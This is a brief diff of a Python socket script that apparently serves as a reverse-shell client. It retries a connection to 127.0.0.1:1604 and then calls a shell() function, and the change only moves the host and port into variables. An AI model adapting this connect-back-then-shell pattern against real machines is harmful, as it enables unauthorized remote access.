@@ -33,7 +33,7 @@ def connection():
 		time.sleep(5)
 		print("LOG: Trying To Connect")	
 		try:
-			s.connect(("127.0.0.1", 1604))
+			s.connect((host, port))
 			print("LOG: connected")
 			shell()
 		except:
@@ -102,6 +102,8 @@ def shell():
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = "127.0.0.1"
+port = 1604
 print("LOGS")
 print("---------------")
 print("LOG: Using IPv4 Succsesfully")
